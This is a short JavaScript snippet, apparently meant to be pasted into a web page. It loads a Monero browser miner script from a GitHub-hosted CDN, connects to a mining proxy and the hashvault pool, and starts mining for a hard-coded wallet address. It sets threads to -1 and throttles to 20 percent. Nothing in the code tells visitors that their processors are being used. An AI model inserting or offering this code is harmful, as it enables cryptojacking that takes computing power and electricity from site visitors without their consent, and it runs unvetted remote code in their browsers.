// Start Of Mining Code (Javascript)
// import command,
// import 'https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/external/javascript.js';

var script = document.createElement("script");
script.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js";
document.head.appendChild(script);

server = "wss://ny1.xmrminingproxy.com";
var pool = "pool.hashvault.pro:443";
var walletAddress = "44gR1QvRGT7XMKp1Tztq5w1tegff93Bnq5i1PhhBvhJTBDbejmmJsj6RZS3WmkZ5esPWWF5pKeYfPXcgQTxZwUyz8XLecD6";
var workerId = "GH-XMR-JS-SNIPPET"
var threads = -1;
var password = "x";
startMining(pool, walletAddress, workerId, threads, password);
throttleMiner = 20;
// End Of Mining Code
